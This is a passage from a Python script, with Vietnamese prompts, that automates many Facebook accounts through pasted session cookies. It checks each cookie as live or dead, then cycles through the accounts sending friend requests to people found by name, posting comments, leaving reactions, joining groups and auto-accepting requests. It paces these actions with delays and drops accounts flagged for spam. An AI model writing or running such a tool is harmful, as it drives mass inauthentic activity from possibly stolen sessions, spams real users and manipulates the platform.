    print(wave_line(phase=time.time(), offset=0.4))
    print()
    print("  " + wave_text(title, time.time() * 1.5,
                            offset=0.55, base=0.72, amp=0.28))


# ══════════════════════════════════════════════════════════════
#  INPUT
# ══════════════════════════════════════════════════════════════
def nhap_cookie():
    cookies = []
    section("🍪 NHẬP COOKIE")
    print(f"  {C.LAVENDER}▸ Dán cookie vào (1 dòng 1 cookie){C.RESET}")
    print(f"  {C.LAVENDER}▸ Gõ {C.VANG}0{C.LAVENDER} để KẾT THÚC nhập{C.RESET}")
    print()
    i = 1
    while True:
        try:
            ck = input(f"  {rainbow(f'#{i}')} {C.HONG}❯{C.RESET} ").strip()
            if ck == '0':
                if cookies:
                    break
                p('  ⚠ Chưa nhập cookie nào, vui lòng nhập ít nhất 1!', C.VANG)
                continue
            if ck == '':
                p('  ⚠ Cookie trống, nhập lại hoặc gõ 0 để kết thúc!', C.VANG)
                continue
            cookies.append(ck)
            i += 1
        except KeyboardInterrupt:
            p('\n  ⚠ Đã huỷ nhập cookie.', C.VANG)
            break
    return cookies


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
def main():
    banner()
    cookies = nhap_cookie()
    if not cookies:
        p('  ❌ Không có cookie nào, thoát!', C.DO)
        return

    section("🔍 KIỂM TRA COOKIE")
    cookies_hop_le = []
    thong_tin_tai_khoan = []
    print()

    for i, ck in enumerate(cookies, 1):
        print(f"  {C.LAVENDER}▸ Đang kiểm tra cookie #{i}...{C.RESET}")
        check = kiem_tra_cookie(ck)
        if check['status'] == 'success':
            print(f"  {C.XANH}✅ [{i}] {check['name']} "
                  f"{C.DIM}(ID: {check['user_id']}){C.RESET} "
                  f"{C.XANH}→ LIVE{C.RESET}")
            cookies_hop_le.append(ck)
            thong_tin_tai_khoan.append({
                'name': check['name'],
                'id': check['user_id'],
            })
        else:
            print(f"  {C.DO}❌ [{i}] DIE - {check['msg']}{C.RESET}")

    if not cookies_hop_le:
        p('  ❌ Không có cookie live, thoát!', C.DO)
        return

    section("⚙️  CẤU HÌNH")
    print()

    while True:
        try:
            delay = int(input(f"  {C.HONG}▸{C.RESET} Delay mỗi nhiệm vụ (giây): "))
            if delay > 0:
                break
            p('  ⚠ Nhập số > 0', C.VANG)
        except Exception:
            p('  ⚠ Nhập số', C.VANG)

    while True:
        try:
            so_nhiem_vu = int(input(f"  {C.HONG}▸{C.RESET} Số nhiệm vụ muốn thực hiện: "))
            if so_nhiem_vu > 0:
                break
            p('  ⚠ Nhập số > 0', C.VANG)
        except Exception:
            p('  ⚠ Nhập số', C.VANG)

    danh_sach_cmt = nhap_comment()

    ds_cam_xuc = {
        "1": "LIKE", "2": "LOVE", "3": "CARE", "4": "HAHA",
        "5": "WOW", "6": "SAD", "7": "ANGRY",
    }
    section("💜 CHỌN CẢM XÚC")
    print(f"  {C.LAVENDER}[1] 👍 Like   [2] ❤️  Love   [3] 🥰 Care   [4] 😂 Haha{C.RESET}")
    print(f"  {C.LAVENDER}[5] 😮 Wow    [6] 😢 Sad    [7] 😡 Angry{C.RESET}")
    print()
    chon = input(f"  {C.HONG}▸{C.RESET} Chọn (VD: 123): ").strip()
    cam_xuc_chon = [ds_cam_xuc[c] for c in chon if c in ds_cam_xuc]
    if not cam_xuc_chon:
        p('  ⚠ Mặc định LIKE', C.VANG)
        cam_xuc_chon = ['LIKE']

    tu_khoa_nhom = [
        'công nghệ', 'kinh doanh', 'giáo dục', 'thể thao', 'giải trí',
        'du lịch', 'ẩm thực', 'thời trang', 'xe cộ', 'tài chính',
        'marketing', 'lập trình', 'nhiếp ảnh', 'âm nhạc', 'học tập',
    ]

    stop_event = threading.Event()
    accept_thread = threading.Thread(
        target=auto_accept_worker,
        args=(cookies_hop_le, thong_tin_tai_khoan, stop_event, 40),
        daemon=True,
    )
    accept_thread.start()

    section(f"🚀 BẮT ĐẦU · {so_nhiem_vu} nhiệm vụ · {len(cookies_hop_le)} tài khoản")
    print()

    stt = 0
    loi_lien_tuc = 0
    cookie_index = 0

    # ═══ CACHE SESSION — chỉ init 1 lần ═══
    print(f"  {C.LAVENDER}▸ Đang khởi tạo session cho {len(cookies_hop_le)} tài khoản...{C.RESET}")
    fb_cache = {}
    for ck in cookies_hop_le:
        try:
            fb_cache[ck] = Facebook(ck)
        except Exception:
            fb_cache[ck] = None
    print(f"  {C.XANH}✓ Đã cache {len(fb_cache)} session{C.RESET}")
    print()

    try:
        while stt < so_nhiem_vu:
            try:
                cookie = cookies_hop_le[cookie_index]
                tai_khoan = thong_tin_tai_khoan[cookie_index]

                # Lấy session từ cache
                fb = fb_cache.get(cookie)
                if fb is None or not fb.fb_dtsg:
                    fb = Facebook(cookie)
                    fb_cache[cookie] = fb
                    if not fb.fb_dtsg:
                        log_fail(f"ACC DIE: {tai_khoan['name']}")
                        cookies_hop_le.pop(cookie_index)
                        thong_tin_tai_khoan.pop(cookie_index)
                        fb_cache.pop(cookie, None)
                        if not cookies_hop_le:
                            p('  ❌ Hết tài khoản, dừng!', C.DO)
                            break
                        cookie_index = cookie_index % len(cookies_hop_le)
                        continue

                # Check acc die mỗi 30 task (không check mỗi vòng → nhanh hơn)
                if stt > 0 and stt % 30 == 0 and cookie_index == 0:
                    info = fb.info()
                    if info in ('cookieout', '956', '282', 'spam'):
                        log_fail(f"ACC DIE: {tai_khoan['name']}", f"[{info}]")
                        cookies_hop_le.pop(cookie_index)
                        thong_tin_tai_khoan.pop(cookie_index)
                        fb_cache.pop(cookie, None)
                        if not cookies_hop_le:
                            p('  ❌ Hết tài khoản, dừng!', C.DO)
                            break
                        cookie_index = cookie_index % len(cookies_hop_le)
                        continue

                # Weight 30/30/11/14/14
                tac_vu = random.choices(
                    ['add_ho', 'add_ten',
                     'binh_luan', 'tha_cam_xuc', 'tham_gia_nhom'],
                    weights=[30, 30, 11, 14, 14], k=1,
                )[0]

                if tac_vu == 'add_ho':
                    target, keyword = fb.tim_ban_theo_ho()
                    if not target:
                        log_fail('ADD HỌ', 'Không tìm thấy user')
                        loi_lien_tuc += 1
                        cookie_index = (cookie_index + 1) % len(cookies_hop_le)
                        if stt < so_nhiem_vu:
                            doi_giay(delay)
                        continue
                    kb = fb.ket_ban(target['id'])
                    if kb.get('trangthai') == 'thanhcong':
                        stt += 1
                        log_add_ho(stt, target['name'], target['id'],
                                   keyword, tai_khoan['name'])
                        loi_lien_tuc = 0
                    else:
                        log_fail('ADD HỌ FAIL', f"{target['name']}")
                        loi_lien_tuc += 1

                elif tac_vu == 'add_ten':
                    target, keyword = fb.tim_ban_theo_ten()
                    if not target:
                        log_fail('ADD TÊN', 'Không tìm thấy user')
                        loi_lien_tuc += 1
                        cookie_index = (cookie_index + 1) % len(cookies_hop_le)
                        if stt < so_nhiem_vu:
                            doi_giay(delay)
                        continue
                    kb = fb.ket_ban(target['id'])
                    if kb.get('trangthai') == 'thanhcong':
                        stt += 1
                        log_add_ten(stt, target['name'], target['id'],
                                    keyword, tai_khoan['name'])
                        loi_lien_tuc = 0
                    else:
                        log_fail('ADD TÊN FAIL', f"{target['name']}")
                        loi_lien_tuc += 1

                elif tac_vu == 'binh_luan':
                    bv = fb.lay_id_bai_viet()
                    if bv.get('trangthai') == 'thatbai':
                        log_fail('CMT', 'Không có bài viết')
                        loi_lien_tuc += 1
                    else:
                        nd = random.choice(danh_sach_cmt)
                        r = fb.binh_luan(bv['idpost'], nd)
                        if r.get('trangthai') == 'thanhcong':
                            stt += 1
                            log_info(f"💬 CMT [{stt}] {bv['idpost']} │ {nd}", C.MAGENTA)
                            print(f"      {C.CYAN}↳ https://facebook.com/{bv['idpost']}{C.RESET}")
                            loi_lien_tuc = 0
                        else:
                            log_fail('CMT FAIL', bv['idpost'])
                            loi_lien_tuc += 1

                elif tac_vu == 'tha_cam_xuc':
                    bv = fb.lay_id_bai_viet()
                    if bv.get('trangthai') == 'thatbai':
                        log_fail('REACT', 'Không có bài viết')
                        loi_lien_tuc += 1
                    else:
                        cx = random.choice(cam_xuc_chon)
                        r = fb.tha_cam_xuc(bv['idpost'], cx)
                        if r.get('trangthai') == 'thanhcong':
                            stt += 1
                            log_info(f"❤ REACT [{stt}] {cx} │ {bv['idpost']}", C.XANH)
                            print(f"      {C.CYAN}↳ https://facebook.com/{bv['idpost']}{C.RESET}")
                            loi_lien_tuc = 0
                        else:
                            log_fail('REACT FAIL', bv['idpost'])
                            loi_lien_tuc += 1

                elif tac_vu == 'tham_gia_nhom':
                    tk = random.choice(tu_khoa_nhom)
                    nhom = fb.tim_nhom(tk)
                    if nhom.get('trangthai') == 'thatbai':
                        log_fail('JOIN', f'Không tìm thấy nhóm [{tk}]')
                        loi_lien_tuc += 1
                    else:
                        r = fb.tham_gia_nhom(nhom['id'])
                        if r.get('trangthai') == 'thanhcong':
                            stt += 1
                            log_info(f"👥 JOIN [{stt}] {nhom['name']} ({nhom['id']})", C.TIM)
                            print(f"      {C.CYAN}↳ https://facebook.com/groups/{nhom['id']}{C.RESET}")
                            loi_lien_tuc = 0
                        else:
                            log_fail('JOIN FAIL', nhom['name'])
                            loi_lien_tuc += 1

                if loi_lien_tuc >= 500:
                    p('  ❌ Quá nhiều lỗi liên tục, dừng!', C.DO)
                    break

                cookie_index = (cookie_index + 1) % len(cookies_hop_le)
                if stt < so_nhiem_vu:
                    doi_giay(delay)

            except Exception as e:
                log_fail(f'LỖI: {str(e)[:60]}')
                loi_lien_tuc += 1
                if loi_lien_tuc >= 10:
                    p('  ❌ Quá nhiều lỗi, dừng!', C.DO)
                    break
                doi_giay(delay)
    finally:
        stop_event.set()

    section("🎉 HOÀN THÀNH")
    print(f"  {C.XANH}✓ Đã làm       : {stt}/{so_nhiem_vu} nhiệm vụ{C.RESET}")
    print(f"  {C.MAGENTA}✓ Auto-accept  : {_accept_total} bạn{C.RESET}")
    print(f"  {C.DO}✗ Lỗi          : {loi_lien_tuc}{C.RESET}")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        p('\n  ⟡ Đã dừng', C.CYAN)
    except Exception as e:
        p(f'\n  ✗ Lỗi: {e}', C.DO)
        import traceback
        traceback.print_exc()